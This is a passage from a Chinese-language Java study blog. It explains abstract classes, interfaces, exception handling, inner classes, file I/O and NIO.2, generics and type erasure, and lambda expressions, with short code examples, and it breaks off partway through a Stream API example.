<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.抽象类不能直接实例化（不能用 new AbstractClass() 创建对象），只能作为父类被子类继承。</span><br><span class="line">    补充：可通过“子类实例化+向上转型”的方式使用抽象类（如 AbstractAnimal animal = new Dog()）。</span><br><span class="line">2.成员组成:</span><br><span class="line">    抽象方法：用 abstract 修饰，无方法体（以分号结尾），表示“待子类实现的方法”，抽象类中可以有 0 个或多个抽象方法；不能被 private、final、static 修饰（会限制子类重写）。</span><br><span class="line">    普通方法：有完整方法体，供子类直接继承复用，无需子类重写（子类可按需重写，重写时遵循方法重写通用规则，访问权限不能比父类更严格）。</span><br><span class="line">    成员变量：支持普通成员变量（可修改，属于对象实例）、静态变量（static，属于抽象类本身，可通过类名直接访问），有默认初始化值。</span><br><span class="line">    构造器：存在构造器（用于子类初始化时，调用父类构造器初始化抽象类的成员变量），但不能用于实例化抽象类本身；子类构造器会默认隐式调用抽象类无参构造器（super()），若抽象类只有有参构造器，子类必须显式调用（super(参数)）且放在第一行。</span><br><span class="line">3.继承规则:</span><br><span class="line">    类继承抽象类时，要么自身也声明为抽象类（可遗留抽象方法，未实现的方法向下传递），要么必须实现抽象类的所有抽象方法。</span><br><span class="line">    Java 是单继承机制，一个子类只能继承一个抽象类（该规则适用于所有Java类，一个类仅有一个直接父类）。</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-接口"><a href="#3-接口" class="headerlink" title="3. 接口"></a>3. 接口</h3><ul>
<li><p><strong>接口定义</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="comment">// 抽象方法（无实现）</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sound</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 默认方法（有实现）</span></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Woof&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接口的使用通过类实例使用</span></span><br><span class="line"><span class="type">Animal</span> <span class="variable">myPet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(); <span class="comment">// ✅ 正确！myPet 是 Animal 接口类型，实际对象是 Dog</span></span><br><span class="line">myPet.sound(); <span class="comment">// 输出: Woof!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>知识点</strong>：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 接口是一种引用类型，用于定义行为规范（抽象方法）。</span><br><span class="line">2. 接口不能直接实例化（不能用 new Interface() 创建对象），只能作为类型被实现或被其他接口继承。</span><br><span class="line">3. java8之前：</span><br><span class="line">    接口可以包含常量（默认 public static final）和抽象方法（默认 public abstract）。</span><br><span class="line">4. java8及以后：</span><br><span class="line">    在3的基础上，接口可以包含默认方法（default 修饰，有方法体）和静态方法（static 修饰，有方法体）。</span><br><span class="line">    注意：默认方法和静态方法不能使用 public abstract 修饰符（二者有方法体，与抽象方法特性冲突）；接口的抽象方法仍默认携带 public abstract 修饰符，可省略不写。</span><br><span class="line">5. 类实现接口时，必须实现接口中的所有抽象方法，否则类必须声明为抽象类。</span><br><span class="line">6. 接口可以继承其他接口，形成接口的层次结构。</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-抽象类与接口的联系总结"><a href="#4-抽象类与接口的联系总结" class="headerlink" title="4. 抽象类与接口的联系总结"></a>4. 抽象类与接口的联系总结</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.  抽象类可以没有抽象方法（但通常会有普通方法）；即使无抽象方法，抽象类依然无法直接实例化。</span><br><span class="line">2.  抽象方法不能被 private/final/static 修饰（冲突特性）；核心原因：这三个修饰符会限制子类重写抽象方法（private不可访问、final不可重写、static不属于实例无法重写）。</span><br><span class="line">3.  抽象类的构造器不能私有化（否则无法被继承）。</span><br><span class="line">4.  抽象类可作为方法参数 / 返回值（体现多态）；实际传入/返回的是抽象类的子类实例（向上转型）。</span><br><span class="line">5.  抽象类可以继承抽象类:</span><br><span class="line">    子抽象类可选择性实现父抽象类的抽象方法（实现部分、实现全部、一个都不实现都可以），未实现的抽象方法会向下传递，由最终的非抽象子类统一实现。</span><br><span class="line">    从中也可以反映：抽象类可以有非抽象方法。</span><br><span class="line">6.  抽象类可以实现接口的部分方法:</span><br><span class="line">    抽象类可以实现接口的部分方法（即实现接口的抽象方法），甚至可以一个都不实现；未实现的方法可以在抽象类中保持抽象状态，继续向下传递。</span><br><span class="line">7.  普通类必须实现接口的所有抽象方法，否则类必须声明为抽象类。</span><br><span class="line">8.  普通类继承抽象类时，必须实现抽象类的所有抽象方法，否则类必须声明为抽象类；此处的“所有抽象方法”包括抽象类自身定义的、继承父抽象类遗留的、实现接口传递下来的所有未完成抽象方法。</span><br><span class="line">9.  类（普通类，内部类，抽象类）只能单继承，但可以实现多个接口。</span><br><span class="line">10. 接口与抽象类的抽象方法：</span><br><span class="line">    接口：</span><br><span class="line">      1.  抽象方法默认修饰符是 public abstract，可省略不写（三种写法等价：void method(); / public void method(); / public abstract void method();）。</span><br><span class="line">      2.  有且仅有 public abstract 这一种修饰符组合，不允许使用 private、protected 等其他任何修饰符，否则编译报错。</span><br><span class="line">      3.  子类重写该抽象方法时，必须使用 public 修饰符（权限不能更严格）。</span><br><span class="line">    抽象类：</span><br><span class="line">      1.  abstract 修饰符必须手动指定（不写则不是抽象方法），无默认的 public abstract/protected abstract 组合。</span><br><span class="line">      2.  访问修饰符支持 2 种：public、protected（可手动指定）；若不指定任何访问修饰符，默认是「包访问权限（default 权限，无关键字）」，非 protected。</span><br><span class="line">      3.  不支持的修饰符：private、final、static（与 abstract 互斥，编译报错）。</span><br><span class="line">      4.  子类重写该抽象方法时，访问权限不能比父类更严格（如父类 protected → 子类 protected/public；父类 public → 子类只能 public）。</span><br></pre></td></tr></table></figure>

<h2 id="六、异常处理解析"><a href="#六、异常处理解析" class="headerlink" title="六、异常处理解析"></a>六、异常处理解析</h2><h3 id="1-异常体系结构"><a href="#1-异常体系结构" class="headerlink" title="1. 异常体系结构"></a>1. 异常体系结构</h3> <img src="/2026/01/02/Java%E5%9F%BA%E7%A1%80/image_2.png" class="" title="在这里插入图片描述">


<ul>
<li><strong>Checked Exception vs Unchecked Exception</strong>：<table>
<thead>
<tr>
<th>类型</th>
<th>特点</th>
<th>举例</th>
<th>处理要求</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Checked Exception</strong></td>
<td>编译时检查</td>
<td><code>IOException</code>, <code>SQLException</code></td>
<td>必须捕获或声明抛出</td>
</tr>
<tr>
<td><strong>Unchecked Exception</strong></td>
<td>运行时异常</td>
<td><code>NullPointerException</code>, <code>IllegalArgumentException</code></td>
<td>可选处理</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="2-异常处理最佳实践"><a href="#2-异常处理最佳实践" class="headerlink" title="2. 异常处理最佳实践"></a>2. 异常处理最佳实践</h3><ul>
<li><p><strong>try-with-resources（JDK7+）</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;file.txt&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 自动关闭资源</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>异常链式处理</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可能抛出异常的代码</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;处理失败&quot;</span>, e); <span class="comment">// 保留原始异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>自定义异常</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomException</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">if</span> (invalidData) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;数据无效&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="七、内部类解析"><a href="#七、内部类解析" class="headerlink" title="七、内部类解析"></a>七、内部类解析</h2><h3 id="1-四种内部类详解"><a href="#1-四种内部类详解" class="headerlink" title="1. 四种内部类详解"></a>1. 四种内部类详解</h3><table>
<thead>
<tr>
<th>类型</th>
<th>定义位置</th>
<th>访问外部类成员</th>
<th>实例化方式</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td><strong>成员内部类</strong></td>
<td>类中方法外</td>
<td>✅ 可直接访问</td>
<td><code>Outer.Inner in = new Outer().new Inner();</code></td>
<td>需外部类实例</td>
</tr>
<tr>
<td><strong>静态内部类</strong></td>
<td>类中方法外+static</td>
<td>❌ 只能访问静态成员</td>
<td><code>Outer.StaticInner si = new Outer.StaticInner();</code></td>
<td>独立于外部类</td>
</tr>
<tr>
<td><strong>局部内部类</strong></td>
<td>方法内</td>
<td>✅ 可访问final局部变量</td>
<td><code>new Inner();</code>（仅在方法内）</td>
<td>作用域仅限方法</td>
</tr>
<tr>
<td><strong>匿名内部类</strong></td>
<td>无名，直接实例化</td>
<td>✅</td>
<td><code>new Interface() &#123; ... &#125;</code></td>
<td>适用于单次使用</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>成员内部类示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">outerField</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(outerField); <span class="comment">// 直接访问外部类私有成员</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">inner.display();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>匿名内部类典型应用</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Java 8+ Lambda写法</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; System.out.println(<span class="string">&quot;Running&quot;</span>)).start();</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="八、文件I-O与NIO-2"><a href="#八、文件I-O与NIO-2" class="headerlink" title="八、文件I&#x2F;O与NIO.2"></a>八、文件I&#x2F;O与NIO.2</h2><h3 id="1-传统IO流体系"><a href="#1-传统IO流体系" class="headerlink" title="1. 传统IO流体系"></a>1. 传统IO流体系</h3><table>
<thead>
<tr>
<th>类型</th>
<th>抽象类</th>
<th>具体实现</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><strong>字节流</strong></td>
<td><code>InputStream</code>&#x2F;<code>OutputStream</code></td>
<td><code>FileInputStream</code>&#x2F;<code>FileOutputStream</code></td>
<td>二进制数据</td>
</tr>
<tr>
<td><strong>字符流</strong></td>
<td><code>Reader</code>&#x2F;<code>Writer</code></td>
<td><code>FileReader</code>&#x2F;<code>FileWriter</code></td>
<td>文本数据</td>
</tr>
<tr>
<td><strong>缓冲流</strong></td>
<td><code>BufferedInputStream</code>&#x2F;<code>BufferedOutputStream</code></td>
<td><code>BufferedInputStream</code>&#x2F;<code>BufferedWriter</code></td>
<td>提高读写效率</td>
</tr>
<tr>
<td><strong>转换流</strong></td>
<td><code>InputStreamReader</code>&#x2F;<code>OutputStreamWriter</code></td>
<td><code>InputStreamReader</code>&#x2F;<code>OutputStreamWriter</code></td>
<td>字节→字符转换</td>
</tr>
</tbody></table>
<ul>
<li><strong>文件读写示例</strong>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取文本文件</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;file.txt&quot;</span>))) &#123;</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入文本文件（追加模式）</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="literal">true</span>))) &#123;</span><br><span class="line">    bw.write(<span class="string">&quot;New line&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-NIO-2核心特性"><a href="#2-NIO-2核心特性" class="headerlink" title="2. NIO.2核心特性"></a>2. NIO.2核心特性</h3><ul>
<li><p><strong>Path与Files工具类</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取所有行</span></span><br><span class="line">List&lt;String&gt; lines = Files.readAllLines(path);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line">Files.write(path, <span class="string">&quot;New content&quot;</span>.getBytes(), StandardOpenOption.CREATE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制文件</span></span><br><span class="line">Files.copy(Paths.get(<span class="string">&quot;source.txt&quot;</span>), Paths.get(<span class="string">&quot;dest.txt&quot;</span>), StandardCopyOption.REPLACE_EXISTING);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>异步文件操作</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AsynchronousFileChannel</span> <span class="variable">channel</span> <span class="operator">=</span> AsynchronousFileChannel.open(Paths.get(<span class="string">&quot;file.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">channel.read(buffer, <span class="number">0</span>, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, Object&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, Object attachment)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Read &quot;</span> + result + <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Object attachment)</span> &#123;</span><br><span class="line">        exc.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="九、泛型"><a href="#九、泛型" class="headerlink" title="九、泛型"></a>九、泛型</h2><h3 id="类型擦除原理"><a href="#类型擦除原理" class="headerlink" title="类型擦除原理"></a><strong>类型擦除原理</strong></h3>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译后实际为：</span></span><br><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">list.add(<span class="string">&quot;Hello&quot;</span>); <span class="comment">// 类型信息被擦除</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">List&lt;Integer&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">System.out.println(list1.getClass() == list2.getClass()); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 因为擦除后，两者都是 ArrayList 类型，JVM 无法区分它们的泛型参数</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>泛型基础</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无标签的盒子：什么都能装</span></span><br><span class="line"><span class="type">List</span> <span class="variable">box</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">box.add(<span class="string">&quot;苹果&quot;</span>);     <span class="comment">// ✅ 水果</span></span><br><span class="line">box.add(<span class="number">123</span>);        <span class="comment">// ✅ 编译通过！但这是数字，不是水果！</span></span><br><span class="line">box.add(<span class="keyword">new</span> <span class="title class_">Car</span>());  <span class="comment">// ✅ 编译通过！但这是汽车，不是水果！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 取出时需要手动类型转换</span></span><br><span class="line"><span class="type">String</span> <span class="variable">fruit</span> <span class="operator">=</span> (String) box.get(<span class="number">0</span>); <span class="comment">// ✅ 正常</span></span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (<span class="type">int</span>) box.get(<span class="number">1</span>);         <span class="comment">// ❌ 运行时错误！int 不能直接转 Object</span></span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (Integer) box.get(<span class="number">1</span>); <span class="comment">// 编译通过，但运行时可能崩溃！所以还是要特定的泛型存储特定的类型</span></span><br><span class="line"><span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> (Car) box.get(<span class="number">2</span>);         <span class="comment">// ✅ 正常</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带“水果标签”的盒子：只能装 String 类型</span></span><br><span class="line">List&lt;String&gt; fruitBox = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">fruitBox.add(<span class="string">&quot;苹果&quot;</span>); <span class="comment">// ✅ 符合标签：String 类型</span></span><br><span class="line">fruitBox.add(<span class="number">123</span>);    <span class="comment">// ❌ 编译直接报错！123 不是 String 类型</span></span><br><span class="line">fruitBox.add(<span class="keyword">new</span> <span class="title class_">Car</span>());<span class="comment">// ❌ 编译直接报错！Car 不是 String 类型</span></span><br><span class="line"><span class="type">String</span> <span class="variable">fruit</span> <span class="operator">=</span> fruitBox.get(<span class="number">0</span>); <span class="comment">// 取出时无需强制转换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用泛型定义“只能装 Integer 的盒子”</span></span><br><span class="line">List&lt;Integer&gt; numberBox = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">numberBox.add(<span class="number">123</span>); <span class="comment">// ✅ 编译通过（123 自动装箱为 Integer）</span></span><br><span class="line"><span class="comment">// numberBox.add(&quot;abc&quot;); // ❌ 编译报错！类型不匹配</span></span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> numberBox.get(<span class="number">0</span>); <span class="comment">// // 取出时直接得到 int（自动拆箱）</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="绕过类型擦除获取泛型类型"><a href="#绕过类型擦除获取泛型类型" class="headerlink" title="绕过类型擦除获取泛型类型"></a><strong>绕过类型擦除获取泛型类型</strong></h3>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeReference</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Type type;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TypeReference</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Type</span> <span class="variable">superclass</span> <span class="operator">=</span> getClass().getGenericSuperclass();</span><br><span class="line">        type = ((ParameterizedType) superclass).getActualTypeArguments()[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Type <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">TypeReference&lt;List&lt;String&gt;&gt; ref = <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;&gt;() &#123;&#125;;</span><br><span class="line">System.out.println(ref.getType()); <span class="comment">// 输出：java.util.List&lt;java.lang.String&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="十、Lambda表达式-java-8"><a href="#十、Lambda表达式-java-8" class="headerlink" title="十、Lambda表达式(java 8+)"></a>十、Lambda表达式(java 8+)</h2><p>Lambda 表达式是 <strong>Java 8 引入的函数式编程特性</strong>，用于简化匿名内部类的写法。它的核心本质是：  </p>
<blockquote>
<p><strong>将“行为”作为参数传递</strong>，让代码更简洁、更易读。</p>
</blockquote>
<h3 id="Lambda-表达式通用语法"><a href="#Lambda-表达式通用语法" class="headerlink" title="Lambda 表达式通用语法"></a><strong>Lambda 表达式通用语法</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(参数列表) -&gt; &#123; 代码块 &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong><code>(参数列表)</code></strong>：函数的输入参数（可省略类型，由编译器自动推断）</li>
<li><strong><code>-&gt;</code></strong>：箭头操作符（固定写法）</li>
<li><strong><code>&#123; 代码块 &#125;</code></strong>：函数体（单行表达式可省略 <code>&#123;&#125;</code> 和 <code>return</code>）</li>
</ul>
<h3 id="语法简化规则"><a href="#语法简化规则" class="headerlink" title="语法简化规则"></a><strong>语法简化规则</strong></h3><h4 id="1️⃣-完整版（带类型和代码块）"><a href="#1️⃣-完整版（带类型和代码块）" class="headerlink" title="1️⃣ 完整版（带类型和代码块）"></a>1️⃣ <strong>完整版（带类型和代码块）</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 完整写法：参数类型明确 + 代码块 + return</span></span><br><span class="line">(<span class="type">int</span> a, <span class="type">int</span> b) -&gt; &#123; </span><br><span class="line">    <span class="keyword">return</span> a + b; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2️⃣-省略参数类型（编译器自动推断）"><a href="#2️⃣-省略参数类型（编译器自动推断）" class="headerlink" title="2️⃣ 省略参数类型（编译器自动推断）"></a>2️⃣ <strong>省略参数类型（编译器自动推断）</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 省略参数类型：a, b 的类型由上下文推断为 int</span></span><br><span class="line">(a, b) -&gt; &#123; </span><br><span class="line">    <span class="keyword">return</span> a + b; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3️⃣-单参数省略括号"><a href="#3️⃣-单参数省略括号" class="headerlink" title="3️⃣ 单参数省略括号"></a>3️⃣ <strong>单参数省略括号</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单参数时可省略括号</span></span><br><span class="line">x -&gt; x * <span class="number">2</span>  <span class="comment">// 等价于 (x) -&gt; &#123; return x * 2; &#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="4️⃣-单行表达式省略-return-和"><a href="#4️⃣-单行表达式省略-return-和" class="headerlink" title="4️⃣ 单行表达式省略 return 和 {}"></a>4️⃣ <strong>单行表达式省略 return 和 {}</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单行表达式可省略 return 和 &#123;&#125;</span></span><br><span class="line">x -&gt; x * <span class="number">2</span>  <span class="comment">// 等价于 x -&gt; &#123; return x * 2; &#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="5️⃣-无参数时用空括号"><a href="#5️⃣-无参数时用空括号" class="headerlink" title="5️⃣ 无参数时用空括号"></a>5️⃣ <strong>无参数时用空括号</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">() -&gt; System.out.println(<span class="string">&quot;Hello&quot;</span>) </span><br><span class="line"><span class="comment">// 等价于 new Runnable() &#123; public void run() &#123; System.out.println(&quot;Hello&quot;); &#125; &#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="经典场景示例"><a href="#经典场景示例" class="headerlink" title="经典场景示例"></a><strong>经典场景示例</strong></h3><h4 id="✅-场景-1：函数式接口实现"><a href="#✅-场景-1：函数式接口实现" class="headerlink" title="✅ 场景 1：函数式接口实现"></a>✅ <strong>场景 1：函数式接口实现</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个函数式接口（只有一个抽象方法）</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">MathOperation</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">operate</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lambda 实现</span></span><br><span class="line"><span class="type">MathOperation</span> <span class="variable">add</span> <span class="operator">=</span> (a, b) -&gt; a + b;      <span class="comment">// 简化版</span></span><br><span class="line"><span class="type">MathOperation</span> <span class="variable">multiply</span> <span class="operator">=</span> (a, b) -&gt; a * b; <span class="comment">// 单行表达式</span></span><br><span class="line"></span><br><span class="line">System.out.println(add.operate(<span class="number">2</span>, <span class="number">3</span>));      <span class="comment">// 5</span></span><br><span class="line">System.out.println(multiply.operate(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>

<h4 id="✅-场景-2：Stream-API-过滤"><a href="#✅-场景-2：Stream-API-过滤" class="headerlink" title="✅ 场景 2：Stream API 过滤"></a>✅ <strong>场景 2：Stream API 过滤</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤偶数：x -&gt; x % 2 == 0</span></span><br><span class="line">List&lt;Integer&gt; evenNumbers = numbers.stream()</span><br><span class="line">    .filter(x -&gt; x % <span class="number">2</span> == <span class="number">0</span>) <span class="comment">// 单参数 + 单行表达式</span></span><br><span class="line">    .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">System.out.println(evenNumbers); <span class="comment">// [2, 4]</span></span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 